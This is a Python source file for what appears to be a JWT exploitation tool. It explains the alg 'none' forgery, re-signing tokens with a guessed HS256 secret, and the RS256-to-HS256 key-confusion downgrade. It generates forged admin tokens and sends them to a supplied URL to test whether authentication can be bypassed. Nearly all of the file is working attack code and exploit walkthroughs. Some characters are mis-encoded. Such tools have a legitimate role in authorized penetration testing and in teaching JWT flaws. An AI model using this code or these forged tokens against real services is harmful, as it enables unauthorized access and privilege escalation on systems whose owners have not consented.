import jwt
import base64
import json
import requests
from termcolor import cprint

# === EXPLAIN FUNCTIONS ===

def explain_alg_none():
    print("\n[!] Exploit: 'alg: none'")
    print("""
âž¤ Description:
  The JWT uses 'alg: none', meaning the signature is not verified.
  If the server accepts such a token, an attacker can forge a valid one.

âž¤ How to exploit:
  1. Base64-encode a header like: {"alg":"none","typ":"JWT"}
  2. Modify the payload (e.g., change role to "admin")
  3. Base64-encode the new payload
  4. Concatenate header.payload. (note: signature is blank!)

âž¤ Example (Python):
  import base64, json
  header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
  payload = base64.urlsafe_b64encode(json.dumps({"role":"admin"}).encode()).decode().rstrip("=")
  print(f"{header}.{payload}.")
""")


def explain_hs256_key_found(secret):
    print(f"\\n[!] Exploit: HS256 with guessable secret")
    print(f"""
âž¤ Description:
  The JWT is signed with a weak or guessable shared secret. You found it: **{secret}**

âž¤ How to exploit:
  Modify the payload and re-sign it using this secret.

âž¤ Example (Python):
  import jwt
  new_payload = {{ "user": "admin" }}
  token = jwt.encode(new_payload, "{secret}", algorithm="HS256")
  print(token)
""")


def explain_rs256_downgrade():
    print("\\n[!] Exploit: RS256 to HS256 Downgrade (Key Confusion)")
    print("""
âž¤ Description:
  The application uses RS256 (public/private key signing) but doesn't enforce key type.
  An attacker can supply HS256 instead and sign the token using the public key as the HMAC secret.

âž¤ Steps:
  1. Get the original RS256 JWT.
  2. Replace the alg in the header: "RS256" â†’ "HS256"
  3. Re-sign the token using the public key as the HMAC secret.

âž¤ Example (Python):
  import jwt

  public_key = open("public.pem", "r").read()
  payload = { "user": "admin" }

  token = jwt.encode(payload, public_key, algorithm="HS256")
  print(token)

âž¤ Tip:
  Only works if backend improperly allows HS256 and uses public key as secret.
""")


def explain_exploit(vuln_id, **kwargs):
    if vuln_id == "alg-none":
        explain_alg_none()
    elif vuln_id == "hs256-key-found":
        secret = kwargs.get("secret")
        if not secret:
            print("[!] Missing --secret argument.")
        else:
            explain_hs256_key_found(secret)
    elif vuln_id == "alg-swap-rs256":
        explain_rs256_downgrade()
    else:
        print(f"[~] No exploit guidance available for: {vuln_id}")


def list_available_exploits():
    print("\\n[+] Available exploit IDs:\\n")
    print("  - alg-none           â†’ No signature verification")
    print("  - hs256-key-found    â†’ HMAC key discovered via brute-force")
    print("  - alg-swap-rs256     â†’ RS256 to HS256 downgrade attack")


# === POC GENERATOR ===

def generate_poc_token(vuln_id, secret=None):
    payload = {"user": "admin", "admin": True}
    if vuln_id == "alg-none":
        header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
        body = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        token = f"{header}.{body}."
    elif vuln_id == "hs256-key-found" and secret:
        token = jwt.encode(payload, secret, algorithm="HS256")
    elif vuln_id == "alg-swap-rs256" and secret:
        token = jwt.encode(payload, secret, algorithm="HS256")  # using public key as secret
    else:
        cprint("[!] Cannot generate PoC: missing secret or invalid vuln ID.", "red")
        return

    cprint(f"\n[+] PoC Token:", "green")
    print(token)
    cprint("\n[+] Example Usage:", "yellow")
    print(f'curl -H "Authorization: Bearer {token}" https://target.com/api')


# === AUTH BYPASS ===

def attempt_bypass(vuln_id, token, url):
    cprint(f"\n[ðŸ”] Testing token bypass at: {url}", "cyan")
    headers = {"Authorization": f"Bearer {token}"}
    try:
        response = requests.get(url, headers=headers, timeout=5)
        cprint(f"[+] Status Code: {response.status_code}", "green")
        print(response.text[:300] + "..." if len(response.text) > 300 else response.text)
    except Exception as e:
        cprint(f"[!] Error during request: {e}", "red")